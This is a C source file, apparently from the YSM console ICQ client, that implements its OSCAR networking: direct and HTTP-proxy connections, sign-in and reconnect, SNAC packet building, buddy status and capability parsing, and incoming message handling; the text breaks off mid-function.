#include "ysm.h"
#include "icqv7.h"
#include "charset.h"
#include "wrappers.h"
#include "prompt.h"
#include "slaves.h"
#include "toolbox.h"
#include "setup.h"
#include "direct.h"
#include "output.h"
#include "bytestream.h"
#include "bs_oscar.h"
#include "network.h"
#include "fingerprint.h"
#include "message.h"
#include "dump.h"
#include "misc.h"

ysm_server_info_t g_sinfo;

int initNetwork(void)
{
    /* zero all sinfo fields */
    memset(&g_sinfo, 0, sizeof(ysm_server_info_t));

    /* Initial seqnum */
    g_sinfo.seqnum = 1;

    /* buddy list information */
    g_sinfo.blgroupsid        = initBs();
    g_sinfo.blusersid         = initBs();
    g_sinfo.blgroupsidentries = 0;
    g_sinfo.blusersidentries  = -1;

    return 0;
}

static int hostToAddress(int8_t *inhost, uint32_t *outaddress)
{
    struct hostent    *myhostent;
#if !defined(WIN32) && !defined(_AIX) && !defined(__sun__) && !defined(sun)
    struct in_addr    myaddr;
    int32_t        retval = 0;
#else
#ifndef    INADDR_NONE
#define    INADDR_NONE    -1
#endif
#endif

    if (inhost == NULL || outaddress == NULL)
        return -1;

    /* first check if we have a number-and-dots notation */
#if !defined(WIN32) && !defined(_AIX) && !defined(__sun__) && !defined(sun)
    retval = inet_aton(inhost, &myaddr);
    if (retval == 0)
    {
#else
    *outaddress = inet_addr(inhost);
    if (*outaddress == INADDR_NONE)
    {
#endif
        /* inet_aton failed, we seem to have a hostname
         * instead of a number-and-dots notation as we
         * previously thought
         */

        myhostent = gethostbyname(inhost);
        if (myhostent == NULL) {
            /* unable to resolve hostname */
            return -1;
        }

        /* get the address */
        memcpy(outaddress, myhostent->h_addr, 4);
    }
#if !defined(WIN32) && !defined(_AIX) && !defined(__sun__) && !defined(sun)
    else
        memcpy(outaddress, &myaddr.s_addr, 4);
#endif

    return 0;
}

static int rawConnect(int8_t *host, uint16_t port)
{
    struct sockaddr_in server;
    int32_t            sock = 0;
    uint32_t           address = 0;

    /* convert host into an ip address if it isn't already */
    if (hostToAddress(host, &address) < 0)
        return -1;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        return -1;

    server.sin_addr.s_addr = address;
    server.sin_port = htons(port);
    server.sin_family = AF_INET;

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
        return -1;

    return sock;
}

/* ProxyHalfConnect:
 *    Takes care of connecting to the proxy server and
 *    returns in order to allow whatever action against
 *    the proxy server is to be taken.
 *
 */

static int proxyHalfConnect(int8_t *host, uint16_t port, struct in_addr *outaddress)
{
    int            proxysock = 0;
    struct in_addr address;

    if (host == NULL)
        return -1;

    /* make sure minimum proxy configuration exists */
    if (atoi(g_model.proxy.host) == 0x00 || !g_model.proxy.port)
        return -1;

    /* do we have to resolve the final address ourselves?.
     * the PROXY_RESOLVE flag tells whether we should let
     * the proxy resolve hostnames for us or not.
     * NOTE, make sure we do this before RawConnect so we
     * don't have to close any sockets if failed.
     */

    if (!(g_model.proxy.flags & YSM_PROXY_RESOLVE))
    {
        /* we have to resolve the hostname */
        if (hostToAddress(host, &address.s_addr) < 0)
            return -1;

        if (outaddress != NULL)
            outaddress->s_addr = address.s_addr;
    }

    /* rawConnect takes care of resolving the host for us */
    proxysock = rawConnect(g_model.proxy.host, g_model.proxy.port);
    if (proxysock < 0)
        return -1;

    return proxysock;
}

static int proxyConnect(int8_t *host, uint16_t port)
{
    int32_t          proxysock = 0;
    uint32_t         x = 0;
    struct in_addr   address;
    int8_t           proxy_string[512], *aux = NULL, *auxb = NULL;

    if (host == NULL)
        return -1;

    proxysock = proxyHalfConnect(host, port, &address);
    if (proxysock < 0)
        return -1;

    /* we now create the 'proxy_string' buffer to send to the
     * proxy server. It will be different for Authentication req
     * servers.
     */

    /* do we have to authenticate against this proxy? */
    if (g_model.proxy.flags & YSM_PROXY_AUTH)
    {
        uint8_t    *credential = NULL, *encoded = NULL;
        uint32_t    length = 0;

        length = strlen(g_model.proxy.username);
        length += strlen(g_model.proxy.password);
        length ++;

        credential = ysm_calloc( 1, length+1, __FILE__, __LINE__ );

        snprintf( credential, length,
                "%s:%s",
                g_model.proxy.username,
                g_model.proxy.password );

        credential[length] = 0x00;

        encoded = encode64(credential);
        snprintf( proxy_string, sizeof(proxy_string),
                "CONNECT %s:%d HTTP/1.0\r\n"
                "Proxy-Authorization: Basic %s\r\n\r\n",
                (g_model.proxy.flags & YSM_PROXY_RESOLVE)
                ? (char *)host : inet_ntoa(address),
                port,
                encoded );

        proxy_string[sizeof(proxy_string) - 1] = 0x00;

        YSM_FREE(credential);
        YSM_FREE(encoded);
    }
    else
    {
        snprintf(proxy_string, sizeof(proxy_string),
                "CONNECT %s:%d HTTP/1.0\r\n\r\n",
                (g_model.proxy.flags & YSM_PROXY_RESOLVE)
                ? (char *)host : inet_ntoa(address),
                port);

        proxy_string[sizeof(proxy_string) - 1] = 0x00;
    }

    /* we will now send the 'proxy_string' buffer to the proxy
     * and read the response.
     */

    printfOutput(VERBOSE_PACKET, "%s", proxy_string);

    if (SOCK_WRITE(proxysock, proxy_string, strlen(proxy_string)) < 0)
    {
        /* handle the error correctly */
        close(proxysock);
        return -1;
    }

    /* we use the same send buffer for receiving as well */
    memset(proxy_string, '\0', sizeof(proxy_string));

    /* read the first response */
    if (YSM_READ_LN(proxysock, proxy_string, sizeof(proxy_string)) <= 0)
    {
        close(proxysock);
        return -1;
    }

    /* parse the response */
    strtok(proxy_string,"\n");
    aux = strtok(proxy_string, "/");
    strtok(NULL, " \t");
    auxb = strtok(NULL, " \t");

    if (aux == NULL || auxb == NULL
            || !strstr( aux, "HTTP" ) || !strstr( auxb, "200" ) ) {

        /* if we get to this point, we got an error on the response.
         * check if it's because we require authentication and we
         * didn't supply one. */

        if (auxb != NULL)
        {
            if (strstr(auxb, "401"))
            {
                /* authentication required */
                printfOutput( VERBOSE_BASE, MSG_ERR_PROXY2 );
            }
            else
            {
                printfOutput( VERBOSE_BASE, "Method FAILED (%s %s)\n", auxb, auxb+strlen(auxb)+1);
            }
        }
        else
        {
            /* unknown error in response */
            printfOutput( VERBOSE_BASE, MSG_ERR_PROXY3 );
        }

        /* close the socket and leave */
        close(proxysock);
        return -1;
    }

    /* the response was successfull.
     * this means we are now connected to the proxy server.
     */

    /* read until the end of the headers */
    do {
        x = YSM_READ_LN( proxysock,
                proxy_string,
                sizeof(proxy_string)
                );
    } while (x);

    /* we return the open socket to the proxy server */
    return proxysock;
}

/* YSM_Connect is the main procedure for connecting to
 * servers. It makes use of proxy configuration if any
 * to connect to the proxy servers.
 */

int YSM_Connect(int8_t *host, uint16_t port, int8_t verbose)
{
    int32_t             mysock = -1, try_count = 0;
    uint32_t            serversize = 0;
    struct sockaddr_in  server;

    if (host == NULL || port == 0)
        return -1;

    /* Note, we don't resolve the host address by now because
     * if connecting through proxy, the user might want the
     * proxy to resolve the address by itself.
     */

    /* first check if the user has configured a proxy */
    if (atoi(g_model.proxy.host) != 0x00)
    {
        /* connect through the proxy and retry twice */
        do {
            mysock = proxyConnect(host, port);
            try_count ++;
        } while (mysock < 0 && try_count < 2);
    }
    else
    {
        /* connect directly */
        mysock = rawConnect(host, port);
    }

    if (mysock < 0)
    {
        /* connect has failed */
        return -1;
    }

    /* get our internal IP address through getsockname */
    serversize = sizeof(server);
    getsockname(mysock, (struct sockaddr *)&server, &serversize);
    g_model.dc.rIP_int = server.sin_addr.s_addr;

    return mysock;
}

/* SignIn to the ICQ Network             */
/* moduled for being able to 'reconnect' */

int networkSignIn(void)
{
    uint16_t port = 0;

    if (g_model.proxy.flags & YSM_PROXY_HTTPS)
        port = 443;
    else
        port = g_model.network.authPort;

    g_model.network.socket = YSM_Connect(
            g_model.network.authHost,
            port,
            0x1);

    DEBUG_PRINT("");

    if (g_model.network.socket < 0)
        return g_model.network.socket;

    YSM_Init_LoginA(g_model.uin, g_model.password);

    return g_model.network.socket;
}

void networkReconnect(void)
{
    slave_t *slave = NULL;

    /* Starting time is 10 seconds */
    uint32_t   x = 10;
    int32_t    y = 0;

    g_sinfo.flags &= ~FL_LOGGEDIN;
    g_state.connected = FALSE;

    /* Reset slaves status */
    lockSlaveList();
    while ((slave = getNextSlave(slave)) != NULL)
    {
        slave->status = STATUS_OFFLINE;
    }
    unlockSlaveList();

    while (y <= 0)
    {
        printfOutput(VERBOSE_BASE,
                "Disconnection detected. "
                "Reconnecting in %d seconds.\n", x);

        threadSleep(x, 0);

        close(g_model.network.socket);

        if ((y = networkSignIn()) < 0)
        {
            if (x < 300)
                x += 5;
            else
            {
                printfOutput(VERBOSE_BASE,
                        "ERR Maximum reconnects reached. "
                        "Network must be down..\n");
                YSM_ERROR(ERROR_NETWORK, 0);
            }
        }
    }
}

static int32_t sendSnac(
        uint8_t       familyId,
        uint8_t       subTypeId,
        uint16_t      flags,
        const int8_t *data,
        uint32_t      size,
        int32_t       lseq,
        uint32_t      reqId)
{
    uint16_t      nseq = 1;
    bsd_t         bsd;
    bs_pos_t      flap;

    DEBUG_PRINT("");

    nseq += lseq;     /* 1+= last seq == new seq */
    g_sinfo.seqnum = nseq;        /* Update the global SEQ trace! */

    if (reqId == 0)
    {
        srand((unsigned int) time(NULL));
        reqId = rand() & 0xffffff7f;
    }

    bsd = initBs();

    /* FLAP header */
    flap = bsAppendFlapHead(bsd, 0x2, nseq, 0);

    /* SNAC header */
    bsAppendWord(bsd, familyId);  /* family id */
    bsAppendWord(bsd, subTypeId); /* family subtype id */
    bsAppendWord(bsd, flags);     /* SNAC flags */
    bsAppendDword(bsd, reqId);    /* SNAC request id */

    /* copy the data */
    if (data)
    {
        bsAppend(bsd, data, size);
    }
    bsUpdateFlapHeadLen(bsd, flap);

    if (writeBs(g_model.network.socket, bsd) < 0)
    {
        freeBs(bsd);
        return -1;
    }

    freeBs(bsd);
    return reqId;
}

void serverResponseHandler(void)
{
    tlv_t        tlv;
    string_t    *str;
    bs_pos_t     pos;
    oscar_msg_t  oscar;

    oscar.bsd = initBs();

    if (bsAppendReadLoop(oscar.bsd, g_model.network.socket, SIZEOF_FLAP_HEAD, 0) < 0)
        return;
    bsRewind(oscar.bsd);
    bsReadFlapHead(oscar.bsd, &oscar.flap);
    bsAppendReadLoop(oscar.bsd, g_model.network.socket, oscar.flap.len, 0);

    if (bsGetFlags(oscar.bsd) & BS_FL_INVALID)
    {
        freeBs(oscar.bsd);
        return;
    }

    pos = bsTell(oscar.bsd);
    bsRewind(oscar.bsd);

    str = initString();
    printfString(str, "IN PACKET\n");
    dumpPacket(str, oscar.bsd);
    writeOutput(VERBOSE_PACKET, getString(str));
    freeString(str);

    bsSeek(oscar.bsd, pos, BS_SEEK_SET);

    switch (oscar.flap.channelId)
    {
        case YSM_CHANNEL_NEWCON:
            break;

        case YSM_CHANNEL_SNACDATA:
            incomingFlapSnacData(&oscar);
            break;

        case YSM_CHANNEL_FLAPERR:
            break;

        case YSM_CHANNEL_CLOSECONN:
            incomingFlapCloseConnection(&oscar);
            break;

        default:
            printfOutput(VERBOSE_MOATA,
                    "\nEl channel ID es: %d\n"
                    "[ERR] Inexisting channel ID=received"
                    "inside a FLAP structure.\n"
                    "As I'm a paranoid one.. i'll disconnect.\n",
                    oscar.flap.channelId);
            break;
    }

    freeBs(oscar.bsd);
}

static const uint8_t Rates_Acknowledge[] = {
    0x00,0x01,0x00,0x02,0x00,0x03,0x00,0x04,0x00,0x05,
};

static void parseCapabilities(slave_t *victim, bsd_t bsd, int32_t len)
{
    uint8_t     i = 0;
    uint8_t     capVal[SIZEOF_CAP];
    uint8_t     capsCount = 0;
    sl_caps_t   caps = 0;
    sl_fprint_t fprint = 0;

    static const struct

    { char *val;        sl_caps_t flag;     char *desc; }

    flagCapsMap[] =
    {
        { CAP_SRVRELAY,     CAPFL_SRVRELAY,     "SRVRELAY"  },
        { CAP_ISICQ,        CAPFL_ISICQ,        "ISICQ"     },
        { CAP_UTF8,         CAPFL_UTF8,         "UTF8"      },
        { CAP_RTF,          CAPFL_RTF,          "RTF"       },
        { NULL,             0,                   NULL       }
    };

    static const struct

    { char *val;        sl_fprint_t fprint;             char *desc;      }

    fprintCapsMap[] =
    {
        { CAP_M2001,        FINGERPRINT_M2000_CLIENT,       "M2001"          },
        { CAP_M2001_2,      FINGERPRINT_M20012_CLIENT,      "M2001_2"        },
        { CAP_M2002,        FINGERPRINT_M2002_CLIENT,       "M2002"          },
        { CAP_MICQ,         FINGERPRINT_MICQ_CLIENT,        "MICQ"           },
        { CAP_MLITE,        FINGERPRINT_MICQLITE_CLIENT,    "ICQ LITE"       },
        { CAP_SIMICQ,       FINGERPRINT_SIMICQ_CLIENT,      "SIMICQ"         },
        { CAP_TRILL_NORM,   FINGERPRINT_TRILLIAN_CLIENT,    "TRILLIAN"       },
        { CAP_TRILL_CRYPT,  FINGERPRINT_TRILLIAN_CLIENT,    "TRILLIAN CRYPT" },
        { CAP_LICQ,         FINGERPRINT_LICQ_CLIENT,        "LICQ"           },
        { NULL,             0,                               NULL            }
    };

    if (victim == NULL || len <= 0)
        return;

    for (capsCount = len / SIZEOF_CAP; capsCount > 0; capsCount--)
    {
        bsRead(bsd, capVal, SIZEOF_CAP);

        for (i = 0; flagCapsMap[i].val != NULL; i++)
        {
            if (!memcmp(capVal, flagCapsMap[i].val, SIZEOF_CAP))
            {
                caps |= flagCapsMap[i].flag;
                printfOutput(VERBOSE_MOATA,
                        "Found cap: %s\n", flagCapsMap[i].desc);
                break;
            }
        }

        if (flagCapsMap[i].val != NULL)
            continue;

        /* might be Fingerprinting Capabilities */
        for (i = 0; fprintCapsMap[i].val != NULL; i++)
        {
            if (!memcmp(capVal, fprintCapsMap[i].val, 16))
            {
                fprint = fprintCapsMap[i].fprint;
                printfOutput(VERBOSE_MOATA,
                        "Found fingerprint cap: %s\n", fprintCapsMap[i].desc);
                break;
            }
        }

        if (fprintCapsMap[i].val != NULL)
            continue;

        for (i = 0; i < SIZEOF_CAP; i++)
            printfOutput(VERBOSE_MOATA, "\\x%.2x", capVal[i]);

        printfOutput(VERBOSE_MOATA, "\n");
    }

    /* this is a patch for ICQ2Go who can't take UTF8 */
    if (fprint == FINGERPRINT_MICQLITE_CLIENT && !(caps & CAPFL_ISICQ))
    {
        caps &= ~CAPFL_UTF8;
        fprint = FINGERPRINT_ICQ2GO_CLIENT;
        printfOutput(VERBOSE_MOATA, "Found an ICQ2Go Client\n");
    }

    victim->caps = caps;
    victim->fprint = fprint;
}

void YSM_BuddyParseStatus(
        slave_t             *victim,     /* IN */
        bsd_t                bsd,        /* IN */
        direct_connection_t *dcinfo,     /* OUT */
        sl_fprint_t         *fprint,     /* OUT */
        uint16_t            *status,     /* OUT */
        uint16_t            *flags,      /* OUT */
        time_t              *onsince,    /* OUT */
        string_t            *statusStr)  /* OUT */
{
    uint16_t    newStatus = 0;
    uint16_t    newFlags = 0;
    sl_fprint_t newFprint;
    uint8_t     number;
    uint16_t    type, len, encoding;
    uint8_t     len8;
    bool_t      notfound = TRUE;
    tlv_t       tlv;
    uint16_t    tlvCount;
    bs_pos_t    nextTlvPos;

    if (victim == NULL)
        return;

    bsSeek(bsd, SIZEOF_WORD, BS_SEEK_CUR); /* skip warning level */
    bsReadWord(bsd, &tlvCount);

    //    DEBUG_PRINT("tlvCount: %d", tlvCount);

    for (; tlvCount > 0; tlvCount--)
    {
        bsReadTlv(bsd, &tlv);
        nextTlvPos = bsTell(bsd) + tlv.len;

        switch (tlv.type)
        {
            case 0x000A:
                if (tlv.len > 0)
                {
                    bsReadDwordLE(bsd, &dcinfo->rIP_ext);
                }
                break;

                /* Direct Connection Info */
            case 0x000C:
                if (tlv.len > 0)
                {
                    /* Internal IP Address */
                    bsReadDwordLE(bsd, &dcinfo->rIP_int);

                    /* Port where client is listening */
                    bsSeek(bsd, SIZEOF_WORD, BS_SEEK_CUR);
                    bsReadWordLE(bsd, &dcinfo->rPort);

                    /* DC type*/
                    bsSeek(bsd, SIZEOF_BYTE, BS_SEEK_CUR);

                    /* Protocol Version */
                    bsReadWordLE(bsd, &dcinfo->version);

                    /* DC Cookie */
                    bsReadDwordLE(bsd, &dcinfo->rCookie);

                    /* Web front port */
                    bsSeek(bsd, SIZEOF_DWORD, BS_SEEK_CUR);

                    /* Client futures */
                    bsSeek(bsd, SIZEOF_DWORD, BS_SEEK_CUR);

                    /* Do fingerprinting. First check if theres the YSM
                     * encryption identification, else look for common
                     * YSM clients (old ones) */

                    /* VS: ???*/

                    bsReadDword(bsd, &newFprint);
                    bsSeek(bsd, SIZEOF_DWORD, BS_SEEK_CUR);
                    bsReadDword(bsd, fprint);

                    if (*fprint != FINGERPRINT_YSM_CLIENT_CRYPT)
                    {
                        *fprint = newFprint;
                    }
                }
                break;

                /* Capabilities */
            case 0x000D:
                if (tlv.len > 0)
                {
                    parseCapabilities(victim, bsd, tlv.len);
                }
                break;

                /* User status */
            case 0x0006:
                notfound = FALSE;
                if (tlv.len > 0)
                {
                    bsReadWord(bsd, &newFlags);
                    bsReadWord(bsd, &newStatus);
                }
                break;

            case 0x0003:
                /* time_t */
                if (tlv.len == 0x4)
                {
                    bsReadDword(bsd, (uint32_t *)onsince);
                    *onsince -= g_model.delta;
                }

                /* just cheat and quit, we only care */
                /* about the STATUS and online since */
                /* by now. */
                break;

                /* user icon id & hash */
            case 0x001D:
                while (bsTell(bsd) < nextTlvPos)
                {
                    bsReadWord(bsd, &type);
                    bsReadByte(bsd, &number);
                    bsReadByte(bsd, &len8);

                    if (type == 0x0002 && statusStr != NULL)
                    {
                        /* a status/available message */
                        if (len8 >= 4)
                        {
                            bsReadString16(bsd, statusStr);
                            bsReadWord(bsd, &encoding);
                            if (encoding == 0x0001)
                            {
                                /* we have an encoding */
                                bsReadWord(bsd, &len);
                                //                                bsReadString16(bsd, &statusStr);
                                bsSeek(bsd, len, BS_SEEK_CUR);
                                clearString(statusStr);
                            }
                            else
                            {
                                /* FIXME:
                                   YSM_CharsetConvertString(
                                   statusStr,
                                   CHARSET_INCOMING,
                                   MFLAGTYPE_UTF8,
                                   TRUE);
                                   */
                            }
                        }
                    }
                }
                break;

            default:
                break;
        }

        bsSeek(bsd, nextTlvPos, BS_SEEK_SET);
    }

    /* This is really raro, at a beginning I believe i was */
    /* actually receiving the ONLINE status change, but it */
    /* now seems i'm not! Anyways, we know that if its an */
    /* ONCOMING bud message and we dont find the status, */
    /* its online, smart, huh? =) */

    if (notfound)
        *status = STATUS_ONLINE;
    else
        *status = newStatus;

    *flags = newFlags;
}

void YSM_BuddyUpdateStatus(
        slave_t             *victim,
        direct_connection_t *dcinfo,
        uint16_t             status,
        sl_flags_t           flags,
        sl_fprint_t          fprint,
        time_t               onsince,
        const string_t      *statusStr)
{
    DEBUG_PRINT("");

    if (victim == NULL || dcinfo == NULL)
        return;

    DEBUG_PRINT("");

    victim->d_con.rIP_int = dcinfo->rIP_int;
    victim->d_con.rIP_ext = dcinfo->rIP_ext;
    victim->d_con.rPort   = htons(dcinfo->rPort);
    victim->d_con.rCookie = dcinfo->rCookie;
    victim->d_con.version = htons(dcinfo->version);

    if (flags & STATUS_FLBIRTHDAY)
    {
        if (victim->budType.birthday != 0x2)
            victim->budType.birthday = 0x1;
    }
    else
        victim->budType.birthday = FALSE;

    /* Fingerprint the remote client */
    switch (fprint)
    {
        case FINGERPRINT_MIRANDA_CLIENT:
        case FINGERPRINT_STRICQ_CLIENT:
        case FINGERPRINT_MICQ_CLIENT:
        case FINGERPRINT_LIB2K_CLIENT:
        case FINGERPRINT_YSM_CLIENT:
        case FINGERPRINT_YSM_CLIENT_CRYPT:
        case FINGERPRINT_TRILLIAN_CLIENT:
        case FINGERPRINT_MICQ2003A_CLIENT_1:
        case FINGERPRINT_MICQ2003A_CLIENT_2:
        case FINGERPRINT_MICQLITE_CLIENT:
            victim->fprint = fprint;
            break;

            /* maybe it was detected inside parseCapabilities */
            /* but if its v8 lets say its an icq 2003 pro A */
        default:
            if (victim->d_con.version == 0x08)
                victim->fprint = FINGERPRINT_MICQ2003A_CLIENT_1;
            break;
    }

    DEBUG_PRINT("");

    if (victim->statusStr)
        YSM_FREE(victim->statusStr);

    DEBUG_PRINT("");

    if (statusStr)
        victim->statusStr = strdup(getString(statusStr));

    /* clear slave fields if its going offline. */
    if (status == STATUS_OFFLINE)
    {
        victim->caps = 0;
        victim->fprint = 0;
    }

    /* Slave Timestamps */
    if (victim->status != status)
    {
        if (victim->status == STATUS_OFFLINE)
        {
            /* If it's the first time we see this
             * victim, don't update the status change.
             */

            if (victim->timing.signOn == 0)
                victim->timing.statusChange = 0;
            else
                victim->timing.statusChange = onsince;

            victim->timing.signOn = onsince;
        }
        else
        {
            victim->timing.statusChange = time(NULL);
        }
    }

    /* 1) is the slave in our ignore list? don't bother us with their
     * status changes, we dont care, we might really hate that slave
     * 2) fix for a known bug where the server keeps re-sending us
     * the status of each slave even though its the very same unchanged
     * 3) are we in CHAT MODE ? we dont print messages which don't belong
     * to our chat session!. */

    if (!victim->budType.ignoreId && victim->status != status
            && !((g_state.promptFlags & FL_CHATM) && !(victim->flags & FL_CHAT)))
    {
        /* Is this slave's Birthday? */
        if (victim->budType.birthday == 0x1)
        {
            printfOutput(VERBOSE_BASE,
                    "INFO BIRTHDAY %ld %s\n",
                    victim->uin, victim->info.nickName);

            /* only inform once this way */
            victim->budType.birthday = 0x2;
        }

        /* Okie, now print the status change line */
        printfOutput(VERBOSE_STCHANGE,
                "INFO STATUS %ld %s %s\n",
                victim->uin, victim->info.nickName, strStatus(status));
    }

    victim->status = status;
}

void YSM_BuddyChangeStatus(const snac_head_t *snac, bsd_t bsd)
{
    direct_connection_t    dcinfo;
    uint16_t      flags = 0;
    sl_status_t   status = STATUS_OFFLINE;
    sl_fprint_t   fprint = 0;
    uint8_t       uinLen = 0;
    time_t        onsince = 0;
    string_t     *statusStr = NULL;
    int8_t       *puin = NULL;
    slave_t      *victim;
    uin_t         uin;

    if (snac == NULL)
        return;

    bsReadByte(bsd, &uinLen);          /* UIN string length */
    if (uinLen >= MAX_UIN_LEN) return;

    puin = YSM_CALLOC(1, uinLen+1);
    bsRead(bsd, puin, uinLen);      /* UIN string */
    uin = atol(puin);
    YSM_FREE(puin);

    //    DEBUG_PRINT("uin: %s", puin);

    lockSlaveList();

    victim = getSlaveByUin(uin);
    
    if (!victim)
    {
        DEBUG_PRINT(
                "Received a status change for UIN %s which is not "
                "in your list.\n", puin);

        unlockSlaveList();
        return;
    }

    memset(&dcinfo, 0, sizeof(dcinfo));

    switch (snac->subTypeId)
    {
        case YSM_SRV_ONCOMING_BUD:
            statusStr = initString();
            YSM_BuddyParseStatus(
                    victim,
                    bsd,
                    &dcinfo,
                    &fprint,
                    &status,
                    &flags,
                    &onsince,
                    statusStr);
            break;

        case YSM_SRV_OFFGOING_BUD:
            DEBUG_PRINT("INFO %ld went offline.", victim->uin);
            break;

        default:
            DEBUG_PRINT("Unknown subtype id");
            return;
    }

    YSM_BuddyUpdateStatus(
            victim,
            &dcinfo,
            status,
            flags,
            fprint,
            onsince,
            statusStr);

    unlockSlaveList();

    if (statusStr)
        freeString(statusStr);
}

void incomingClientAck(flap_head_t *flap, bsd_t bsd)
{
    uint8_t   *autotext = NULL;
    uint8_t    mType = 0;
    uint32_t   pos = 0;
    uint8_t    len = 0;
    uint16_t   txtlen = 0;
    uint16_t   type;

    bsSeek(bsd, 8, BS_SEEK_CUR);
    bsReadWord(bsd, &type);

    if (type != 0x02)
    {
        /* this should be a type 2 ACK */
        return;
    }

    /* here comes a BSTR with the UIN */
    bsReadByte(bsd, &len);
    if (len > MAX_UIN_LEN)
    {
        /* someone is fcking with us? */
        return;
    }

    bsSeek(bsd, len + 1 + 2, BS_SEEK_CUR);
    bsReadByte(bsd, &len);

    if (len != 0x1b && len != 0x00)
    {
        /* this should be the len of a sub chunk.
         * we only allow either 1b or 0.
         */
        return;
    }

    bsReadByte(bsd, &len);
    bsSeek(bsd, len + 1 + 2 + 4 + 12, BS_SEEK_CUR);

    /* we only care about 'auto message' replies */
    bsReadByte(bsd, &mType);

    switch (mType)
    {
        case 0xe8:
        case 0xe9:
        case 0xea:
        case 0xeb:
        case 0xec:

            bsSeek(bsd, 2 + 2 + 2, BS_SEEK_CUR);
            bsReadWord(bsd, &txtlen);

            if (txtlen > 0)
            {
                /* there is an automessage text! */
                autotext = YSM_CALLOC(1, txtlen + 1);
                bsRead(bsd, autotext, txtlen);

                printfOutput(VERBOSE_BASE,
                        "\r\n%-15.15s" " : \n%s\n",
                        "Auto message",
                        YSM_CharsetConvertOutputString(&autotext, 1));

                YSM_FREE(autotext);
            }
    }
}

/*
 * The return value of this function should tell its caller if its
 * required to send an ACK, since certain m_types dont require ACKS.
 * ret = 0 -> something happened, error type normal (DC handles this)
 * ret < 0 -> something happened, error type critical (DC handles this)
 * ret = 1 -> everything went ok, dont send an ACK.
 * ret > 1 -> everything went ok, send an ACK.
 */

void sendAckType2(msg_t *msg)
{
    bsd_t bsd;

    bsd = initBs();

    bsAppend(bsd, msg->id, 8);                  /* msg-id cookie */
    bsAppendWord(bsd, 0x0002);                  /* message channel */
    bsAppendPrintfString08(bsd, "%ld", msg->sender->uin); /* screenname str08 */
    bsAppendWord(bsd, 0x0003);                  /* reason code */

    bsAppendWordLE(bsd, 0x1B);                  /* length of following data */
    bsAppendWordLE(bsd, YSM_PROTOCOL_VERSION);  /* protocol version */
    bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16);
    bsAppendWord(bsd, 0x0000);                  /* unknown */
    bsAppendDwordLE(bsd, 0x00000003);           /* client capabilities flag */
    bsAppendByte(bsd, 0x00);                    /* unknown */
    bsAppendWordLE(bsd, msg->seq);              /* seq? */

    bsAppendWordLE(bsd, 0x0E);                  /* length of following data */
    bsAppendWordLE(bsd, msg->seq);              /* seq? */
    bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0", 12);

    bsAppendWordLE(bsd, msg->type);             /* message type */
    bsAppendWordLE(bsd, 0x0000);                /* status code */
    bsAppendWordLE(bsd, 0x0000);                /* priority code */
    bsAppendWordLE(bsd, 0x01);                  /* message string length */
    bsAppendByte(bsd, 0x00);                    /* message asciiz */
    bsAppendDwordLE(bsd, 0x00000000);           /* text color */
    bsAppendDwordLE(bsd, 0x00FFFFFF);           /* background color */

    sendSnac(0x04, 0x0b, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0x0B);

    freeBs(bsd);
}


static uint8_t parseAuthMessage(msg_t *msg)
{
    uint16_t  len;
    uint16_t  i;
    uint8_t  *buf = NULL;
    uint8_t   num = 0;
    uint8_t  *preason = NULL;
    string_t *str = NULL;

    buf = getString(msg->data);
    len = strlen(getString(msg->data));

    for (i = 0; i < len; i++)
    {
        if (*(buf + i) == 0xfe)
            num++;

        /* on the 5th 0xfe we have the reason msg */
        if (num == 5)
        {
            preason = strchr(buf + i, 0xfe);
            if (preason != NULL)
            {
                str = initString();
                concatString(str, preason);
                clearString(msg->data);
                concatString(msg->data, getString(str));
                freeString(str);
            }
            else
            {
                clearString(msg->data);
                concatString(msg->data, "No reason");
            }

            return 0;
        }
    }

    clearString(msg->data);
    return 1;
}


static int32_t YSM_ReceiveMessageData(msg_t *msg)
{
    uint8_t *datap = NULL, *preason = NULL;
    int32_t  i = 0, c = 0, ret = 2;

    DEBUG_PRINT("from %ld, len: %d",
            msg->sender->uin, strlen(getString(msg->data)));

    msg->sender->timing.lastMessage = time(NULL);

    switch (msg->type)
    {
        case YSM_MESSAGE_NORMAL:
            break;

        case YSM_MESSAGE_AUTH:
            parseAuthMessage(msg);
            break;

        case YSM_MESSAGE_CONTACTS:
        case YSM_MESSAGE_URL:
            break;

        case YSM_MESSAGE_ADDED:        /* these msgs lack of data */
        case YSM_MESSAGE_AUTHOK:
        case YSM_MESSAGE_AUTHNOT:
            clearString(msg->data);
            //            datap = NULL;
            break;

        case YSM_MESSAGE_PAGER:
            //            datap = msgData + 1;
            break;

        case YSM_MESSAGE_GREET:
            /* only with slaves */
            if (msg->sender->reqId != -1) /* TODO: change value !!! */
            {
                /* we use m_data and not message here because these
                 * messages had a blank LNTS before them. Tricky huh. */
                ret = YSM_DC_IncomingMessageGREET(msg);
            }
            return ret;

        case YSM_MESSAGE_FILE:
            /* only with slaves */
            if (msg->sender->reqId != -1) /* TODO: change value !!! */
            {
                /* This is done in v7, but, clients such as TRILLIAN
                 * who identify theirselves as v8 clients, still send
                 * this. What a pain in the ass man, come on!  */

                ret = YSM_DC_IncomingMessageFILE(msg);
            }
            return ret;

        default:
            printfOutput(VERBOSE_MOATA,
                    "WARN Unknown msgType has been received.\n");

            return 1;
    }

    displayMessage(msg);

    return ret;
}

void YSM_ReceiveMessageType1(bsd_t bsd, msg_t *msg)
{
    uint16_t   dataLen = 0;
    uint16_t   msgLen = 0;
    tlv_t      tlv;
    bs_pos_t   startPos;
    bs_pos_t   pos;
    uint16_t   charsetNumber = 0;

    DEBUG_PRINT("");

    bsReadTlv(bsd, &tlv);

    if (tlv.type != 0x2)
        return;

    dataLen = tlv.len;
    startPos = bsTell(bsd);

    /* to have a limit in case anything happens */
    while (bsTell(bsd) - startPos < dataLen 
            && bsReadTlv(bsd, &tlv) == SIZEOF_TLV_HEAD)
    {
        pos = bsTell(bsd);

        switch (tlv.type)
        {
            case 0x0101:      /* Message TLV */
                msgLen = tlv.len - SIZEOF_WORD*2;

                /* here comes encoding information:
                   0x0000 -> US-ASCII
                   0x0002 -> UCS-2BE
                   */

                bsReadWord(bsd, &charsetNumber);
                bsSeek(bsd, SIZEOF_WORD, BS_SEEK_CUR); /* charset subset */

                if (charsetNumber == 0x2)
                {
                    /* its UTF-16 (UCS-2BE) */
